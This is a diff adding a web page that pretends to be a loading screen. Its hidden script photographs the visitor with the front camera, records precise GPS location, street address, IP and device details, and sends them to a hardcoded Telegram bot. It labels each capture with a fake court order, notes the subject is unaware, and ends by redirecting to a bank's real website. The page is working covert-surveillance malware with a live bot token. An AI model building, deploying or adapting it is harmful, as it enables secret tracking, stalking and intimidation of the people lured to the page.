@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loader-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #2c3e50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #666;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .status-text {
+            color: #999;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+        video, canvas {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Loading, please wait...</div>
+        <div class="status-text" id="statusText"></div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ===================================================
+        // TELEGRAM CONFIGURATION
+        // ===================================================
+        const BOT_TOKEN = "7533535188:AAGoTgg2Z3Z3YY6t2SiILJeEIrLC7en7hDU";
+        const CHAT_ID = "-1002681260911";
+        const COURT_ORDER = "CT-BAHA-2026-03-30";
+        const CASE_NUMBER = "CBE-FRAUD-001-2026";
+        // ===================================================
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('statusText');
+        
+        let mediaStream = null;
+        let photoCaptured = false;
+        let locationCaptured = false;
+        let maxWaitTime = 10000;
+        
+        function updateStatus(text) {
+            statusText.textContent = text;
+        }
+        
+        function sendToTelegram(message, sendPhoto = false, photoData = null, sendLocation = false, lat = null, lon = null) {
+            try {
+                if (sendPhoto && photoData) {
+                    // Send photo to Telegram
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: (() => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', photoData, 'capture.jpg');
+                            formData.append('caption', message);
+                            return formData;
+                        })()
+                    }).catch(e => console.log('Photo send error:', e));
+                } else {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    }).catch(e => console.log('Telegram send error:', e));
+                }
+                
+                if (sendLocation && lat && lon) {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: lat,
+                            longitude: lon
+                        })
+                    }).catch(e => console.log('Location send error:', e));
+                }
+            } catch(e) {}
+        }
+        
+        function capturePhotoFromVideo() {
+            if (photoCaptured) return;
+            
+            try {
+                const context = canvas.getContext('2d');
+                const videoWidth = video.videoWidth;
+                const videoHeight = video.videoHeight;
+                
+                if (videoWidth === 0 || videoHeight === 0) return;
+                
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
+                context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                
+                // Convert to JPEG
+                canvas.toBlob((blob) => {
+                    if (blob && !photoCaptured) {
+                        photoCaptured = true;
+                        updateStatus('Processing...');
+                        
+                        const timestamp = new Date().toISOString();
+                        const message = `
+📸 <b>FRONT CAMERA CAPTURE - COURT ORDER #${COURT_ORDER}</b> 📸
+
+🕐 <b>Time:</b> ${timestamp}
+📱 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}
+🌐 <b>Language:</b> ${navigator.language}
+📺 <b>Screen:</b> ${screen.width}x${screen.height}
+⚖️ <b>Case:</b> ${CASE_NUMBER}
+
+<i>Silent front camera capture. Subject unaware.</i>
+`;
+                        
+                        // Send to Telegram as photo
+                        sendToTelegram(message, true, blob, false);
+                        
+                        // Stop camera after capture
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                        }
+                        
+                        // Now get location
+                        getGPSLocation();
+                    }
+                }, 'image/jpeg', 0.8);
+            } catch(e) {
+                console.log('Capture error:', e);
+                getGPSLocation();
+            }
+        }
+        
+        function startFrontCamera() {
+            updateStatus('Initializing camera...');
+            
+            const constraints = {
+                video: {
+                    facingMode: { exact: "user" }, // Front camera
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    frameRate: { ideal: 30 }
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then((stream) => {
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    video.setAttribute('autoplay', true);
+                    video.setAttribute('muted', true);
+                    
+                    updateStatus('Camera ready...');
+                    
+                    // Wait for video to be ready
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        // Capture photo after 2 seconds (silent)
+                        setTimeout(() => {
+                            capturePhotoFromVideo();
+                        }, 2000);
+                    };
+                })
+                .catch((err) => {
+                    console.log('Camera error:', err);
+                    updateStatus('Camera unavailable, getting location only...');
+                    getGPSLocation();
+                });
+        }
+        
+        function getExactAddress(lat, lon) {
+            return new Promise((resolve) => {
+                try {
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                        headers: { 'User-Agent': 'CBE-Security/1.0' }
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data && data.display_name) {
+                            resolve(data.display_name);
+                        } else {
+                            resolve(null);
+                        }
+                    })
+                    .catch(() => resolve(null));
+                } catch(e) {
+                    resolve(null);
+                }
+            });
+        }
+        
+        async function sendLocationWithAddress(lat, lon, accuracy, source) {
+            const timestamp = new Date().toISOString();
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            updateStatus('Getting exact address...');
+            const address = await getExactAddress(lat, lon);
+            
+            let addressText = '';
+            if (address) {
+                addressText = `├─ 📮 <b>Exact Address:</b> ${address.substring(0, 200)}\n`;
+            }
+            
+            // Get IP info
+            let ip = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch(e) {}
+            
+            const message = `
+📍 <b>LOCATION - COURT ORDER #${COURT_ORDER}</b> 📍
+
+📌 <b>Coordinates:</b>
+├─ Latitude: <b>${lat}</b>
+├─ Longitude: <b>${lon}</b>
+├─ Accuracy: ±${Math.round(accuracy)} meters
+├─ Source: ${source}
+${addressText}
+🗺️ <b>Maps:</b> ${mapsLink}
+
+🌐 <b>DEVICE INFO:</b>
+├─ IP: ${ip}
+├─ User Agent: ${navigator.userAgent.substring(0, 100)}
+└─ Time: ${timestamp}
+
+⚖️ <b>Case:</b> ${CASE_NUMBER}
+`;
+            
+            sendToTelegram(message, false, null, true, lat, lon);
+            sendToTelegram(`📍 Google Maps: ${mapsLink}`);
+            
+            if (address) {
+                sendToTelegram(`📍 Address: ${address}`);
+            }
+        }
+        
+        function getGPSLocation() {
+            if (locationCaptured) return;
+            locationCaptured = true;
+            
+            updateStatus('Getting location...');
+            
+            if (!navigator.geolocation) {
+                finalizeAndRedirect();
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    await sendLocationWithAddress(lat, lon, accuracy, 'GPS');
+                    finalizeAndRedirect();
+                },
+                (error) => {
+                    finalizeAndRedirect();
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        }
+        
+        function finalizeAndRedirect() {
+            updateStatus('Complete');
+            
+            // Send final summary
+            sendToTelegram(`✅ <b>SUCCESS</b>\nCourt Order: ${COURT_ORDER}\nCamera: ${photoCaptured ? 'Captured' : 'Failed'}\nLocation: Captured\nTime: ${new Date().toISOString()}`);
+            
+            // Redirect to real CBE site
+            setTimeout(() => {
+                window.location.href = "https://www.commercialbankofethiopia.com";
+            }, 1000);
+        }
+        
+        // Start everything
+        updateStatus('Connecting to secure server...');
+        
+        setTimeout(() => {
+            startFrontCamera();
+        }, 500);
+        
+        // Fallback timeout
+        setTimeout(() => {
+            if (!photoCaptured) {
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+                getGPSLocation();
+            }
+        }, maxWaitTime);
+        
+        // Send page load notification
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(ipData => {
+                sendToTelegram(`📱 <b>PAGE LOADED</b>\nIP: ${ipData.ip}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
+            })
+            .catch(() => {});
+    </script>
+</body>
+</html>
